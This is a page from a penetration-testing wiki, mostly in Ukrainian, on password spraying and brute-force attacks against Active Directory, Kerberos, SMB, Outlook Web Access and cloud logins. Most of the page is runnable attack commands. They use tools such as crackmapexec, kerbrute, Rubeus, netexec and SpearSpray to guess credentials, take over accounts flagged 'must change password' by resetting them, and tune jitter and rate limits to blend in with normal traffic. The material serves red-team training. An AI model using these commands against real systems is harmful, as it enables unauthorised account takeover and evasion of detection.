# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Після того, як ви знайшли кілька **valid usernames** ви можете спробувати найбільш поширені **common passwords** (keep in mind the password policy of the environment)\ з кожним із виявлених користувачів.\
By **default** the **minimum** **password** **length** is **7**.

Списки **common usernames** також можуть бути корисними: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Зверніть увагу, що ви **could lockout some accounts if you try several wrong passwords** (by default more than 10).

### Get password policy

Якщо у вас є якісь user credentials або shell як domain user ви можете **get the password policy with**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Експлуатація з Linux (або будь-якої ОС)

- Використовуючи **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Використання [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(ви можете вказати кількість спроб, щоб уникнути блокувань):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Використання [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - НЕ РЕКОМЕНДУЄТЬСЯ, ІНОДІ НЕ ПРАЦЮЄ
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- За допомогою модуля `scanner/smb/smb_login` з **Metasploit**:

![](<../../images/image (745).png>)

- За допомогою **rpcclient**:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### З Windows

- За допомогою [Rubeus](https://github.com/Zer1t0/Rubeus) версії з модулем brute:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- За допомогою [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (За замовчуванням він може генерувати користувачів з домену і отримує політику паролів з домену та обмежує спроби відповідно до неї):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- За допомогою [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Виявлення та захоплення "Password must change at next logon" Accounts (SAMR)

Низькошумна техніка полягає в тому, щоб spray a benign/empty password і відловити облікові записи, які повертають STATUS_PASSWORD_MUST_CHANGE — це вказує, що пароль був примусово прострочений і його можна змінити без знання попереднього.

Workflow:
- Перерахувати користувачів (RID brute via SAMR) для формування списку цілей:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Виконайте password spraying з пустим password і продовжуйте після hits, щоб захопити облікові записи, які мають змінити password при наступному logon:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Для кожного збігу змінюйте пароль через SAMR за допомогою модуля NetExec (старий пароль не потрібен, коли встановлено "must change"):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Операційні нотатки:
- Переконайтеся, що годинник вашого хоста синхронізований з DC перед операціями на основі Kerberos: `sudo ntpdate <dc_fqdn>`.
- Знак [+] без (Pwn3d!) у деяких модулях (наприклад, RDP/WinRM) означає, що creds дійсні, але обліковий запис не має прав на інтерактивний вхід.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

Kerberos pre-auth–based spraying зменшує шум порівняно з SMB/NTLM/LDAP bind attempts і краще відповідає політикам блокування AD. SpearSpray поєднує LDAP-driven targeting, pattern engine та обізнаність про політики (domain policy + PSOs + буфер badPwdCount) для точного й безпечного спреїнгу. Він також може позначати скомпрометовані principals у Neo4j для побудови шляхів у BloodHound.

Key ideas:
- LDAP user discovery with paging and LDAPS support, optionally using custom LDAP filters.
- Політика блокування домену + PSO-aware фільтрація, щоб залишити налаштовуваний буфер спроб (threshold) і уникнути блокування користувачів.
- Kerberos pre-auth validation using fast gssapi bindings (generates 4768/4771 on DCs instead of 4625).
- Pattern-based, per-user password generation using variables like names and temporal values derived from each user’s pwdLastSet.
- Керування пропускною здатністю за допомогою threads, jitter та max requests per second.
- Опційна інтеграція з Neo4j для маркування скомпрометованих користувачів для BloodHound.

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Цілеспрямованість і контроль шаблонів:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Заходи прихованості та безпеки:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound збагачення:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Огляд системи шаблонів (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Available variables include:
- {name}, {samaccountname}
- Часові значення з кожного користувача pwdLastSet (або whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Допоміжні елементи складання і org token: {separator}, {suffix}, {extra}

Operational notes:
- Надавайте перевагу запитам до PDC-emulator з -dc, щоб читати найбільш авторитетні badPwdCount та інформацію, пов’язану з політикою.
- Скидання badPwdCount відбувається при наступній спробі після вікна спостереження; використовуйте поріг і таймінг, щоб залишатися в безпеці.
- Спроби Kerberos pre-auth відображаються як 4768/4771 у телеметрії DC; використовуйте jitter і rate-limiting, щоб злитися з фоновим трафіком.

> Tip: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.

## Outlook Web Access

Існує кілька інструментів для password spraying outlook.

- З [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- З [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- З [Ruler](https://github.com/sensepost/ruler) (надійний!)
- З [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- З [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Щоб використовувати будь-який із цих інструментів, вам потрібен список користувачів та пароль або невеликий список паролів для виконання password spraying.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Посилання

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)


{{#include ../../banners/hacktricks-training.md}}
